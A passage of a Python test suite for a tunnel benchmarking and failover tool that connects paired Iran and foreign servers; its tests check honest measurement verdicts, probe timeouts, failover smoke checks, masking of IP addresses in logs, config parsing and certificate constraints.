        # Loss is an absolute measurement, so it degrades a tunnel with or without a baseline.
        pair["base_rtt_ms"] = 0.0
        ir_m.state["packet_loss"] = 9.0
        rep3 = failover.TunnelHealthChecker.check_health(ir_m, fr_m, pair, "chisel-wss", dry_run=True)
        self.assertEqual(rep3.status, "DEGRADED", f"9% loss has to degrade: {rep3.details}")

    def test_44_a_tunnel_the_environment_cannot_host_is_not_a_performance_verdict(self):
        """Live finding, §7.7 step 7 pilot: the first protocol of the real sweep came back with
        score 0.0, loss 100% and disqualified=1 because `systemctl restart
        best-tunnel-bench-p1-gre.service` failed with

            delete tunnel "grep1b" failed: No such device
            add tunnel "gre0" failed: File exists

        The kernel keys a GRE tunnel by its (local, remote) tuple, and the production underlay on
        these two hosts already holds that tuple, so the bench namespace cannot come up beside a live
        deployment of the same protocol - the protocol was never measured. SQLite keeps that row, and
        FailoverCandidateSelector reads SQLite, so the two things that must not follow are a score and
        a failover target. MockSSHClient always let `ip tunnel add` succeed, which is why 43 offline
        tests could not find this.
        """
        collision = ('Job for best-tunnel-bench-p1-gre.service failed because the control process '
                     'exited with error code.\nOct 09 19:12:19 ip[57508]: add tunnel "gre0" '
                     'failed: File exists')
        self.assertIn("NOT_MEASURABLE", engine.classify_environment_block(collision),
                      "a tunnel the host cannot host must be named as an environment limit")
        self.assertIn("NOT_MEASURABLE", engine.classify_environment_block(
            "2026/10/09 19:12:19 [ERROR] listen tcp 10.10.11.2:8897: bind: address already in use"))
        self.assertEqual(engine.classify_environment_block("curl: (7) Failed to connect to 127.0.0.1 port 8898"),
                         "", "an ordinary failure must not be excused as an environment block")

        # The fix for the collision itself: the bench namespace asks the kernel for a distinct tunnel
        # by setting a key, which is what makes the same (remote, local) tuple creatable twice. The
        # production unit stays unkeyed, because its outer header is the thing a censor sees and the
        # thing the measurement is supposed to describe.
        ir_pub, fr_pub = "198.51.100.10", "203.0.113.20"
        bench = protocols.generate_benchmark_plan("GRE", 1, ir_pub, fr_pub,
                                                  test_frontend=8898, test_transport=8897)
        prod = protocols.generate_deployment("GRE", 1, ir_pub, fr_pub, 443)
        keys = []
        for side in ("iran_files", "foreign_files"):
            cfg = "".join(bench[side].values())
            m = re.search(r"ip tunnel add grep1b mode gre remote \S+ local \S+ ttl 255"
                          r" ikey (\d+) okey (\d+)", cfg)
            self.assertIsNotNone(m, f"{side}: the bench GRE tunnel is unkeyed, so it cannot coexist "
                                    f"with a live GRE tunnel between the same two addresses")
            self.assertEqual(m.group(1), m.group(2), f"{side}: ikey and okey must match on both ends")
            keys.append(m.group(1))
        self.assertEqual(keys[0], keys[1], "Iran and Foreign must be given the same key pair")
        self.assertNotIn("ikey", "".join(prod["iran_files"].values())
                         + "".join(prod["foreign_files"].values()),
                         "production GRE must keep the packet shape the product is sold on")

        # Same run, second defect: systemd ignored the sweep's lifetime bound on the bench GRE unit
        # ("RuntimeMaxSec= has no effect in combination with Type=oneshot. Ignoring." on both hosts).
        # The bound is only a bound where systemd honours it, so it is injected into the units that
        # accept it and not faked on the ones that do not.
        gre_units = {p: c for p, c in list(bench["iran_files"].items())
                     + list(bench["foreign_files"].items()) if p.endswith(".service")}
        self.assertTrue(gre_units, "the bench GRE plan wrote no systemd unit")
        for path, content in gre_units.items():
            self.assertIn("Type=oneshot", content, f"{path}: bench GRE is expected to be oneshot")
            self.assertNotIn("RuntimeMaxSec", content,
                             f"{path}: RuntimeMaxSec on a Type=oneshot unit is ignored by systemd, "
                             f"so keeping it claims a lifetime bound that does not exist")
        chisel_bench = protocols.generate_benchmark_plan("chisel-wss", 1, ir_pub, fr_pub,
                                                         test_frontend=8898, test_transport=8897)
        capped = [c for p, c in list(chisel_bench["iran_files"].items())
                  + list(chisel_bench["foreign_files"].items())
                  if p.endswith(".service") and "Type=simple" in c]
        self.assertTrue(capped, "the bench chisel plan wrote no Type=simple unit")
        for content in capped:
            self.assertIn("RuntimeMaxSec=600", content,
                          "Type=simple bench units must still be bounded")

        pid = storage.add_pair(name=f"env_block_{int(time.time() * 1000)}", iran_host="198.51.100.10",
                               foreign_host="203.0.113.20", frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        pair = {"id": pid, "name": "env_block", "frontend": 9443, "frontend_port": 9443,
                "iran": {"host": "198.51.100.10", "port": 22},
                "foreign": {"host": "203.0.113.20", "port": 22}}
        ir_m = mock_ssh.MockSSHClient(host_role="iran")
        fr_m = mock_ssh.MockSSHClient(host_role="foreign")
        for m in (ir_m, fr_m):
            m.state["fail_cmd"] = f"systemctl restart best-tunnel-bench-p{pid}-gre"
            m.state["fail_stderr"] = collision

        res = engine.run_single_benchmark(pair, "GRE", dry_run=False, ir_runner=ir_m, fr_runner=fr_m,
                                          base_rtt=37.54)
        self.assertTrue(res["disqualified"], "an unstarted tunnel cannot be offered as a good candidate")
        self.assertTrue(res.get("not_measurable"),
                        f"the sweep recorded a score for a protocol it never measured: {res['dq_reasons']}")
        self.assertIn("NOT_MEASURABLE", " ".join(res["dq_reasons"]))

        storage.record_benchmark(pid, "GRE", res, run_id="test_44")
        # Every alternative is also disqualified by nothing - so the ranking is empty and the fallback
        # list is what decides. GRE must not come back through it.
        chosen = failover.FailoverCandidateSelector.select_best_candidate(
            pid, "chisel-wss", allowed_protocols=["GRE", "wstunnel-v10"])
        self.assertEqual(chosen, "wstunnel-v10",
                         "failover picked a protocol this pair could not even start")
        self.assertIsNone(failover.FailoverCandidateSelector.select_best_candidate(
            pid, "chisel-wss", allowed_protocols=["GRE"]),
            "with nothing but a blocked protocol to choose from, the honest answer is no candidate")

        # A pair that has never been benchmarked at all keeps the old deterministic behaviour.
        fresh = storage.add_pair(name=f"never_bench_{int(time.time() * 1000)}", iran_host="198.51.100.11",
                                 foreign_host="203.0.113.21", frontend_port=9443)
        self.addCleanup(storage.delete_pair, fresh)
        self.assertEqual(failover.FailoverCandidateSelector.select_best_candidate(
            fresh, "chisel-wss", allowed_protocols=["GRE", "wstunnel-v10"]), "GRE",
            "absence of evidence is not evidence of failure: an unbenchmarked pair still gets GRE")

    def test_45_probe_budgets_must_outlast_the_ssh_channel_timeout(self):
        """Live finding, §7.7 step 7: with the GRE bench tunnel up and healthy on both hosts, the
        benchmark still died with `Execution error: TimeoutError:` - an empty message, because that is
        all paramiko's channel timeout gives. The stability window is 30 samples x 1s interval, so it
        prints nothing for ~35-90s while the SSH read gave up after 30s. Every protocol in the sweep was
        killed at the same step, and the loss probe (30 x 1.5s) and the GRE ping (30 x -W 1) were next
        in line. MockSSHClient answers instantly, so 44 offline tests could not see it.
        """
        import inspect
        import probe as probe_mod
        default_timeout = inspect.signature(mock_ssh.MockSSHClient.run).parameters["timeout"].default
        self.assertEqual(default_timeout, 30, "the SSH default is what the probe budgets are measured against")

        # 1. Each mode's budget must cover what its own loop can take.
        stable = probe_mod.cmd_timeout("stability", probe_mod.STABILITY_SAMPLES,
                                       probe_mod.STABILITY_INTERVAL, probe_mod.OUTAGE_GAP)
        self.assertGreater(stable, default_timeout,
                           f"the stability window outlasts the channel again: {stable}s")
        self.assertGreater(probe_mod.cmd_timeout("loss"), default_timeout)
        self.assertGreater(probe_mod.cmd_timeout("lat"), default_timeout)
        for sub, worst in (("stability", probe_mod.STABILITY_SAMPLES * (2 + probe_mod.STABILITY_INTERVAL)),
                           ("loss", probe_mod.SAMPLE_COUNT["loss"] * (1.5 + probe_mod.INTER_SLEEP_S)),
                           ("lat", probe_mod.SAMPLE_COUNT["lat"] * (3 + probe_mod.INTER_SLEEP_S))):
            budget = probe_mod.cmd_timeout(sub, probe_mod.STABILITY_SAMPLES, probe_mod.STABILITY_INTERVAL)
            self.assertGreaterEqual(budget, worst, f"{sub} budget {budget}s is below its own {worst}s")

        # 2. The numbers above must be the numbers the deployed probe actually uses, or the budget
        #    drifts away from the script it is sizing for.
        src = probe_mod.PROBE_SOURCE
        self.assertIn('fetch(host, port, "/test_1k", 3)', src, "lat's per-request timeout moved")
        self.assertIn('fetch(host, port, "/test_1k", 1.5)', src, "loss's per-request timeout moved")
        self.assertIn('fetch(host, port, "/test_1k", 2)', src, "stability's per-request timeout moved")
        self.assertIn("total = 30", src, "loss sample count moved")
        self.assertIn("for _ in range(10)", src, "lat sample count moved")

        # 3. The engine must actually hand those budgets to the runner, not just define them.
        class RecordingClient(mock_ssh.MockSSHClient):
            def __init__(self, **kw):
                super().__init__(**kw)
                self.calls = []

            def run(self, cmd, check=True, best_effort=False, timeout=30, retryable=False):
                self.calls.append((cmd, timeout))
                return super().run(cmd, check=check, best_effort=best_effort, timeout=timeout)

        ir_r = RecordingClient(host_role="iran")
        fr_r = mock_ssh.MockSSHClient(host_role="foreign")
        pair = {"id": 45, "name": "budgets", "frontend": 9443, "frontend_port": 9443,
                "iran": {"host": "198.51.100.10", "port": 22},
                "foreign": {"host": "203.0.113.20", "port": 22}}
        engine.run_single_benchmark(pair, "chisel-wss", dry_run=False, ir_runner=ir_r,
                                    fr_runner=fr_r, base_rtt=37.5)
        # Match the invocation (`best_probe.py stability ...`), never the bare mode word: the
        # installer heredoc embeds PROBE_SOURCE, which mentions every mode while running in
        # instant, timeout-irrelevant file writes.
        by_kind = {}
        for cmd, timeout in ir_r.calls:
            for kind in ("stability", "loss", "lat", "ladder"):
                if f"best_probe.py {kind}" in cmd:
                    by_kind.setdefault(kind, []).append(timeout)
            if "iperf3 -c" in cmd:
                by_kind.setdefault("iperf3", []).append(timeout)
        for kind in ("stability", "loss", "lat"):
            self.assertIn(kind, by_kind, f"the {kind} probe never ran - nothing proves its timeout")
            self.assertTrue(all(t > default_timeout for t in by_kind[kind]),
                            f"{kind} still runs on the {default_timeout}s channel default: {by_kind[kind]}")
        # The ladder steps are short by design, so the rule is not "beat the 30s default" but
        # "beat the probe's own per-request deadline": a read that gives up before the step's
        # timeout expires reports a slow transfer as an execution error.
        self.assertIn("ladder", by_kind, "the ladder probe never ran - nothing proves its timeout")
        for cmd, timeout in ir_r.calls:
            if "best_probe.py ladder" not in cmd:
                continue
            to_sec = float(cmd.split()[-1])
            self.assertGreater(timeout, to_sec,
                               f"ladder step allows {to_sec}s of transfer inside a {timeout}s read: {cmd}")
        # iperf3 -J prints its JSON only when the test finishes, so the read window has to cover
        # the declared duration plus handshake, not the 30s default.
        for cmd, timeout in ir_r.calls:
            if "iperf3 -c" not in cmd:
                continue
            dur = float(cmd.split()[cmd.split().index("-t") + 1])
            self.assertGreaterEqual(timeout, dur + 5,
                                    f"iperf3 needs {dur}s of measurement inside a {timeout}s read: {cmd}")

        # 4. A channel timeout has to name the command that hit it.
        class HangingClient:
            def exec_command(self, cmd, timeout=30):
                raise TimeoutError()

        runner = mock_ssh.SafeSSHRunner(HangingClient(), hostname="198.51.100.10")
        with self.assertRaises(TimeoutError) as ctx:
            runner.run("python3 /usr/local/bin/best_probe.py stability 127.0.0.1 8898 30 1.0 3",
                       best_effort=True, timeout=117)
        self.assertIn("117s", str(ctx.exception))
        self.assertIn("best_probe.py stability", str(ctx.exception),
                      "a timeout that names nothing is the failure mode this test exists for")
    def test_46_a_switchover_that_carries_no_traffic_must_not_be_recorded_as_success(self):
        """Stage 6 of execute_failover asked only `systemctl is-active`, and on success stamped the
        pair ACTIVE and wrote 'Successfully failed over ... in Nms' to the audit log. A successor
        whose daemon stays up while carrying nothing - no route over the underlay, peer not listening
        yet, auth rejected - therefore ended the failover machinery with a success verdict and an
        outage, and the operator's only signal was the absence of service. The fresh GRE deployment
        path already refuses to commit without an L7 round-trip (engine.deploy_tunnel); the failover
        path is held to the same bar here.
        """
        ir_pub, fr_pub = "198.51.100.10", "203.0.113.20"
        pid = storage.add_pair(name=f"smoke_{int(time.time() * 1000)}", iran_host=ir_pub,
                               foreign_host=fr_pub, frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        storage.update_pair_status(pid, status="ACTIVE", active_tunnel="chisel-wss")
        pair = {"id": pid, "name": "smoke", "frontend": 9443, "frontend_port": 9443,
                "iran": {"host": ir_pub, "port": 22}, "foreign": {"host": fr_pub, "port": 22}}

        def runners(silent: bool):
            ir_m, fr_m = mock_ssh.MockSSHClient(host_role="iran"), mock_ssh.MockSSHClient(host_role="foreign")
            if silent:
                # Units come up and stay up in both cases; only the traffic is missing, which is
                # precisely the distinction `systemctl is-active` cannot make.
                ir_m.state["fail_cmd"] = "best_probe.py lat"
                ir_m.state["fail_stderr"] = "URLError: connection refused"
            return ir_m, fr_m

        ir_ok, fr_ok = runners(False)
        mgr = failover.FailoverManager(min_interval_seconds=0, max_failovers_per_window=10)
        res_ok = mgr.execute_failover(
            pair, "chisel-wss", "wstunnel-v10", reason="positive control", dry_run=False,
            ir_runner=ir_ok, fr_runner=fr_ok)
        self.assertTrue(res_ok.get("success"),
                        f"a working successor must still succeed: {res_ok.get('error')}")

        storage.update_pair_status(pid, status="ACTIVE", active_tunnel="chisel-wss")
        ir_bad, fr_bad = runners(True)
        res_bad = mgr.execute_failover(
            pair, "chisel-wss", "wstunnel-v10", reason="outage that looks active", dry_run=False,
            ir_runner=ir_bad, fr_runner=fr_bad)
        self.assertFalse(res_bad.get("success"),
                         "units active with no L7 round-trip is an outage, not a failover success")
        self.assertIn("no L7 round-trip", str(res_bad.get("error")),
                      f"the verdict has to name what was missing: {res_bad.get('error')}")
        self.assertEqual(storage.get_pair(pid).get("active_tunnel"), "chisel-wss",
                         "a failed switchover must not stamp the pair as running the new protocol")
        actions = [a.get("action") for a in storage.get_audit_logs(limit=40)]
        self.assertIn("FAILOVER_FAILED", actions,
                      "the refusal must be in the audit trail the operator reads")
    def test_159_transport_only_switch_accepts_a_proven_absent_backend(self):
        """The mirror of test_46, for the case deploy_tunnel already accepts: the successor's
        units are up and its frontend is listening, but the delivery port on the peer answers
        nothing at all - no application behind the tunnel, not a broken tunnel. Live pair 1
        (2026-10-29/30) failed every overlay switch this way: backend_port unset, so delivery
        is the frontend number, and nothing listens there on the peer. The switch smoke must
        accept that transport-only shape, while still refusing a backend that listens but does
        not answer (answered) and a frontend that is not listening at all.

        The flow cases use frontend 8898 because the mock binds a started best-tunnel unit's
        listener to that port (its bench-frontend model); on a real host Stage 5's enable --now
        binds the pair's actual frontend. The helper's own branches are covered directly with
        arbitrary ports below.
        """
        ir_pub, fr_pub = "198.51.100.10", "203.0.113.20"
        mgr = failover.FailoverManager(min_interval_seconds=0, max_failovers_per_window=10)

        def fresh_pair():
            pid = storage.add_pair(name=f"to_{int(time.time() * 1000)}", iran_host=ir_pub,
                                   foreign_host=fr_pub, frontend_port=8898)
            self.addCleanup(storage.delete_pair, pid)
            storage.update_pair_status(pid, status="ACTIVE", active_tunnel="chisel-wss")
            return {"id": pid, "name": "to", "frontend": 8898, "frontend_port": 8898,
                    "iran": {"host": ir_pub, "port": 22}, "foreign": {"host": fr_pub, "port": 22}}

        def runners(fr_listeners=None):
            ir_m, fr_m = mock_ssh.MockSSHClient(host_role="iran"), mock_ssh.MockSSHClient(host_role="foreign")
            if fr_listeners is not None:
                fr_m.state["listeners"] = dict(fr_listeners)
            ir_m.state["lat_no_sample"] = True
            return ir_m, fr_m

        # 1. Frontend listening (Stage 5 binds it) + peer backend absent -> success, flagged.
        pair = fresh_pair()
        ir_m, fr_m = runners()
        res = mgr.execute_failover(pair, "chisel-wss", "wstunnel-v10", reason="transport-only",
                                   dry_run=False, ir_runner=ir_m, fr_runner=fr_m)
        self.assertTrue(res.get("success"), f"transport-only successor must succeed: {res.get('error')}")
        self.assertTrue(res.get("transport_only"))
        self.assertEqual(storage.get_pair(pair["id"]).get("active_tunnel"), "wstunnel-v10")

        # 2. Backend listens but does not answer -> still a failure, as in test_46.
        pair = fresh_pair()
        ir_m, fr_m = runners({8898: "svc", 22: "sshd"})
        res = mgr.execute_failover(pair, "chisel-wss", "wstunnel-v10", reason="answered backend",
                                   dry_run=False, ir_runner=ir_m, fr_runner=fr_m)
        self.assertFalse(res.get("success"))
        self.assertIn("no L7 round-trip", str(res.get("error")))

        # 3. The helper's own branches, with arbitrary ports.
        def helper(ir_listeners, fr_listeners):
            ir_m, fr_m = mock_ssh.MockSSHClient(host_role="iran"), mock_ssh.MockSSHClient(host_role="foreign")
            ir_m.state["listeners"] = dict(ir_listeners)
            fr_m.state["listeners"] = dict(fr_listeners)
            return failover._transport_only_accept(ir_m, fr_m, 9443, None)

        self.assertTrue(helper({9443: "frpc", 22: "sshd"}, {22: "sshd"})[0])
        self.assertFalse(helper({22: "sshd"}, {22: "sshd"})[0],
                         "a frontend that is not listening must not accept")
        self.assertFalse(helper({9443: "frpc"}, {9443: "svc", 22: "sshd"})[0],
                         "a listening backend that does not answer must not accept")
        self.assertFalse(helper({9443: "frpc"}, {})[0],
                         "an unreadable peer must not accept")
    def test_47_a_persisted_error_must_not_carry_a_routable_host_address(self):
        """The first live sweep row is evidence against the product: the bench GRE unit failed to
        restart, `SafeSSHRunner` raised "Remote command failed (exit 1) on <routable ip>: systemctl
        restart ...", and engine.run_single_benchmark wrote that exception text verbatim into
        benchmarks.details_json as both `dq_reasons` and `ladder_error`. Row 1 of the live database
        therefore held the test server's address - the same route by which the previous servers'
        addresses reached review documents (storage.py:13-18). Pair rows keep their hosts because the
        tool cannot function without them; a *log* field has no such need.
        """
        pid = storage.add_pair(name=f"mask_{int(time.time() * 1000)}", iran_host="198.51.100.10",
                               foreign_host="203.0.113.20", frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        routable = "203.0.113.20"
        metrics = {
            "score": 0.0, "disqualified": True,
            "dq_reasons": [f"Execution error: RuntimeError: Remote command failed (exit 1) on "
                           f"{routable}: systemctl restart best-tunnel-bench-p1-gre"],
            "ladder_error": f"Remote command failed (exit 1) on {routable}: systemctl restart ...",
            "logs": {"iran": f"connected from {routable} via 10.11.61.1",
                     "foreign": "listener on 127.0.0.1:8898 and 192.168.4.9:22"},
            "breakdown": {"lat_avg": 0.0, "loss_pct": 100.0, "seconds_survived": 0.0},
        }
        bid = storage.record_benchmark(pid, "GRE", metrics, run_id="mask-run")
        row = [b for b in storage.get_benchmarks(pid) if b["id"] == bid][0]
        blob = row["details_json"]
        self.assertNotIn(routable, blob,
                         "a routable address was persisted in a benchmark log field")
        self.assertIn("[addr]", blob, "the mask has to leave a mark, or nothing distinguishes it from a truncation")
        # The addresses that describe only the bench topology stay readable, because the diagnosis
        # depends on them and they identify nothing outside the two hosts.
        self.assertIn("10.11.61.1", blob, "the GRE underlay address is private and must survive masking")
        self.assertIn("127.0.0.1:8898", blob, "loopback must survive masking")
        self.assertIn("192.168.4.9", blob, "RFC1918 must survive masking")

        storage.log_audit(pid, "FAILOVER_FAILED", "EXCEPTION",
                          f"ssh to {routable} timed out on the underlay 10.10.11.2")
        entry = [a for a in storage.get_audit_logs(limit=50)
                 if a.get("pair_id") == pid and a.get("action") == "FAILOVER_FAILED"][0]
        self.assertNotIn(routable, entry["details"])
        self.assertIn("10.10.11.2", entry["details"])
        # Pair rows are functional data, not logs, so they are untouched by this rule.
        self.assertEqual(storage.get_pair(pid)["foreign_host"], routable)
    def test_48_every_generated_config_must_parse_before_a_daemon_is_asked_to_run_it(self):
        """§7.7 step 7, live: xray-reverse came back score 0.0, loss 100%, disqualified, and the only
        reason it looked like a DPI result is that nothing between the template and the root daemon
        parsed the JSON. The Foreign bridge crash-looped on
        "invalid character '{' after array element" (line 27, the second routing rule) while the Iran
        portal said 'empty worker list'. The generator had been emitting that file for every version
        this suite ever approved, and 47 tests found it because they validate dicts, not the text a
        daemon reads.
        """
        ir_tun, fr_tun = "10.10.11.1", "10.10.11.2"
        checked = 0
        for proto in protocols.get_supported_protocols():
            for kind, build in (("prod", lambda p: protocols.generate_deployment(p, 1, ir_tun, fr_tun, 9443)),
                                ("bench", lambda p: protocols.generate_benchmark_plan(
                                    p, 1, ir_tun, fr_tun, test_frontend=8898, test_transport=8897))):
                plan = build(proto)
                for side in ("iran_files", "foreign_files"):
                    for path, content in plan[side].items():
                        if not (path.endswith(".json") and isinstance(content, str)):
                            continue
                        try:
                            json.loads(content)
                        except json.JSONDecodeError as exc:
                            raise AssertionError(
                                f"{proto}/{kind} wrote {path} that does not parse: {exc.msg} "
                                f"line {exc.lineno} col {exc.colno}") from exc
                        checked += 1
        self.assertGreaterEqual(checked, 8,
                                f"only {checked} configs were parsed - the loop proved nothing")

        # The defect itself, asserted rather than relied on: the bridge needs both routing rules, and
        # two objects in one array need a comma between them.
        bridge = json.loads(protocols.generate_deployment(
            "xray-reverse", 1, ir_tun, fr_tun, 9443)["foreign_files"]["/etc/best-tunnel/xray/prod-bridge-p1.json"])
        rules = bridge["routing"]["rules"]
        self.assertEqual(len(rules), 2, f"the reverse split needs both rules, got {len(rules)}")
        self.assertEqual(rules[0]["outboundTag"], "tunnel-out",
                         "the domain-matched rule must send reverse traffic to the portal")
        self.assertEqual(rules[1]["outboundTag"], "local-dest",
                         "everything else must be delivered locally, or the bridge is an open proxy")

        # And the guard has teeth: a plan with an unparseable config must be refused at build time.
        with self.assertRaises(ValueError) as ctx:
            protocols._validate_plan_configs({"iran_files": {"/x/broken.json": '{"a": [1 2]}'}},
                                             "example", "bench")
        self.assertIn("its own parser rejects", str(ctx.exception))
        self.assertIn("example/bench", str(ctx.exception),
                      "the refusal must name the protocol so a sweep failure is traceable")

    def test_49_a_partial_run_must_keep_the_measurements_it_actually_took(self):
        """The first live xray-reverse run hung on a single iperf3 reverse leg (§7.7 step 7) and the
        failure path converted that into a row claiming 0.0 ms latency, 100% loss and 0 Mbps for a
        tunnel that had just served a complete 1 MB ladder step. A truncated run is not comparable to
        a full one, so it must stay disqualified and unscored - but throwing away the stages that did
        finish destroys the only evidence naming which step hung.
        """
        pair = {"id": 95, "name": "partial_run", "frontend": 443,
                "iran": {"host": "198.51.100.10", "port": 22},
                "foreign": {"host": "203.0.113.20", "port": 22}}

        # The healthy baseline is measured, not assumed, so this test compares two runs of the same
        # mock transport instead of hardcoding numbers the mock happens to emit today.
        baseline = engine.run_single_benchmark(
            pair, "GRE", dry_run=False,
            ir_runner=mock_ssh.MockSSHClient(host_role="iran"),
            fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
        self.assertFalse(baseline["disqualified"], "the mock baseline must be a healthy run")

        class HangingIperfServer(mock_ssh.MockSSHClient):
            def run(self, cmd, check=True, best_effort=False, timeout=30, retryable=False):
                if "nohup iperf3 -s" in cmd:
                    raise TimeoutError(f"remote command timed out after {timeout}s: {cmd[:120]}")
                return super().run(cmd, check=check, best_effort=best_effort, timeout=timeout)

        truncated = engine.run_single_benchmark(
            pair, "GRE", dry_run=False,
            ir_runner=mock_ssh.MockSSHClient(host_role="iran"),
            fr_runner=HangingIperfServer(host_role="foreign"))

        self.assertTrue(truncated["disqualified"], "a truncated run must never rank as a candidate")
        self.assertEqual(truncated["score"], 0.0)
        self.assertTrue(any("Execution error" in r for r in truncated["dq_reasons"]),
                        truncated["dq_reasons"])
        t_bd = truncated["breakdown"]
        for key in ("lat_avg", "jitter_ms", "loss_pct", "seconds_survived"):
            self.assertEqual(t_bd[key], baseline["breakdown"][key],
                             f"the {key} measured before the hang was overwritten with a default")
        self.assertNotEqual(t_bd["lat_avg"], 0.0, "a carried latency of 0.0 reads as a perfect tunnel")
        self.assertNotEqual(t_bd["loss_pct"], 100.0, "a carried loss of 100% reads as a dead tunnel")
        self.assertGreater(t_bd["throughput_mbps"], 0.0, "the completed 1 MB ladder step was zeroed")
        for stage in ("probe", "stability", "ladder_step_4"):
            self.assertIn(stage, truncated["stages_measured"],
                          f"the row must say which stages produced evidence: {truncated['stages_measured']}")
        self.assertNotIn("iperf3", truncated["stages_measured"])

        # A leg that fails must cost only that leg, and -R needs the budget for two streaming periods.
        budgets = {}

        class HangingReverseLeg(mock_ssh.MockSSHClient):
            def run(self, cmd, check=True, best_effort=False, timeout=30, retryable=False):
                if "iperf3 -c" in cmd:
                    budgets["reverse" if "-R" in cmd else "forward"] = timeout
                    if "-R" in cmd:
                        raise TimeoutError(f"remote command timed out after {timeout}s: {cmd[:120]}")
                return super().run(cmd, check=check, best_effort=best_effort, timeout=timeout)

        one_legged = engine.run_single_benchmark(
            pair, "GRE", dry_run=False,
            ir_runner=HangingReverseLeg(host_role="iran"),
            fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
        self.assertFalse(one_legged["disqualified"],
                         f"one unavailable leg is not a tunnel verdict: {one_legged['dq_reasons']}")
        info = one_legged["iperf3"]
        self.assertTrue(info["available"])
        self.assertGreater(info["upload_mbps"], 0.0)
        self.assertEqual(info["download_mbps"], 0.0)
        self.assertTrue(any("reverse leg did not complete" in e for e in info["leg_errors"]), info)
        self.assertEqual(info["throughput_mbps"], info["upload_mbps"],
                         "a one-legged result must not be averaged against a missing zero")
        self.assertGreater(budgets["reverse"], budgets["forward"],
                           f"-R streams for a second period: {budgets}")

    def test_50_no_completed_sample_is_a_failed_measurement_not_a_999ms_latency(self):
        """The first live xray-reverse run scored 0.0 with `overhead_ratio 23.661` and a dq reason
        blaming packet loss, while its latency column read 999.0 ms. Nothing was ever 999 ms: the
        probe completed zero of ten requests and printed a fabricated `AVG:999.00`, which the engine
        parsed as a measurement. A number that means "no data" must not be printable as data, and
        readiness has to mean a round trip completed, not that a socket accepted.
        """
        # 1. The probe itself: no sample leaves a non-numeric marker.
        src = probe.PROBE_SOURCE
        self.assertNotIn("AVG:999.00", src,
                         "the no-sample branch must not print a number the engine will score")
        self.assertIn("AVG:NOSAMPLE", src)

        pair = {"id": 94, "name": "no_sample", "frontend": 443,
                "iran": {"host": "198.51.100.10", "port": 22},
                "foreign": {"host": "203.0.113.20", "port": 22}}
        ir_m = mock_ssh.MockSSHClient(host_role="iran")
        fr_m = mock_ssh.MockSSHClient(host_role="foreign")
        ir_m.state["lat_no_sample"] = True

        res = engine.run_single_benchmark(pair, "chisel-wss", dry_run=False,
                                          ir_runner=ir_m, fr_runner=fr_m, base_rtt=38.0)
        self.assertTrue(res["disqualified"])
        self.assertEqual(res["score"], 0.0)
        reasons = " ".join(res["dq_reasons"])
        self.assertIn("MEASUREMENT_FAILED", reasons, res["dq_reasons"])
        self.assertIn("NOSAMPLE", reasons,
                      "the reason must carry the probe's own words so the operator can tell "
                      "'no request completed' from 'the tunnel is slow'")

        # 2. Health reporting says the same thing to an operator instead of quoting the budget.
        #    Units are up and loss reads clean, so the only possible verdict comes from the probe.
        ir_h, fr_h = mock_ssh.MockSSHClient(host_role="iran"), mock_ssh.MockSSHClient(host_role="foreign")
        for m in (ir_h, fr_h):
            m.connect("198.51.100.10")
            m.state["lat_no_sample"] = True
            m.state["packet_loss"] = 0.0
        ir_h.state["services"]["best-tunnel-prod-p94-chisel-server"] = "active"
        fr_h.state["services"]["best-tunnel-prod-p94-chisel-client"] = "active"
        ir_h.state["listeners"][9443] = "tunnel_client"
        health_pair = dict(pair, frontend=9443, frontend_port=9443)

        h_res = failover.TunnelHealthChecker.check_health(ir_h, fr_h, health_pair, "chisel-wss",
                                                          base_rtt=38.0)
        self.assertNotIn("999", h_res.details, h_res.details)
        self.assertIn("no completed sample", h_res.details)
        self.assertNotEqual(h_res.status, "HEALTHY",
                            "a tunnel with no completed request can never be reported healthy")

        # 3. Readiness is an L7 round trip, not a socket that accepts. A reverse overlay publishes its
        #    frontend listener before the control channel to the far-side origin exists, so a TCP
        #    connect succeeds on a tunnel that cannot serve a single request - which is what produced
        #    the empty latency sample set above.
        src_bench = inspect.getsource(engine.run_single_benchmark)
        self.assertIn('probe.cmd("ladder", target_ip, test_frontend, "/test_1k", 1024, 4)', src_bench,
                      "readiness must fetch through the tunnel")
        self.assertNotIn("s.connect(('127.0.0.1'", src_bench,
                         "a bare socket connect must not be the readiness test")

    def test_51_a_trust_anchor_the_verifier_refuses_is_not_a_tunnel(self):
        """The live chisel client connected to the port and then rejected the server on every attempt:
        "certificate signed by unknown authority (possibly because of x509: invalid signature: parent
        certificate cannot sign this kind of certificate)". The orchestrator ships the same
        self-signed PEM as both the server identity and the client trust anchor, and that PEM carried
        only a SAN - no basicConstraints - while the standalone installer's `openssl req -x509`
        certificate, which verifies on these same hosts, carries critical CA:TRUE. Every offline test
        passed because MockSSHClient never loads a certificate.
        """
        from cryptography import x509
        from cryptography.x509.oid import ExtensionOID
        import ipaddress
        import subprocess

        doc_ip = "198.51.100.10"
        cert_pem, key_pem = protocols.generate_self_signed_cert(doc_ip)
        cert = x509.load_pem_x509_certificate(cert_pem.encode())
        self.assertEqual(cert.subject, cert.issuer, "the anchor must be self-signed")

        bc = cert.extensions.get_extension_for_oid(ExtensionOID.BASIC_CONSTRAINTS)
        self.assertTrue(bc.value.ca,
                        "a certificate a client is told to trust as an anchor must be a CA")
        self.assertTrue(bc.critical, "openssl issues this extension critical; so must we")
        ku = cert.extensions.get_extension_for_oid(ExtensionOID.KEY_USAGE)
        self.assertTrue(ku.value.key_cert_sign, "without keyCertSign the cert cannot sign its own chain")
        san = cert.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
        self.assertIn(ipaddress.IPv4Address(doc_ip), san.value.get_values_for_type(x509.IPAddress),
                      "the client dials this address, so this is the only name it will accept")

        # Prove it with a verifier rather than with a comment: the platform OpenSSL must accept the
        # shipped PEM as its own trust anchor.
        openssl = shutil.which("openssl")
        if openssl:
            with tempfile.TemporaryDirectory() as d:
                anchor = os.path.join(d, "anchor.pem")
                with open(anchor, "w", encoding="ascii") as fh:
                    fh.write(cert_pem)
                res = subprocess.run([openssl, "verify", "-CAfile", anchor, anchor],
                                     capture_output=True, text=True)
                self.assertEqual(res.returncode, 0, res.stdout + res.stderr)

        # And the three transports that pin an anchor must pin the certificate the server presents.
        for proto, anchor_name in (("chisel-wss", "chisel-prod-p7-ca.pem"),
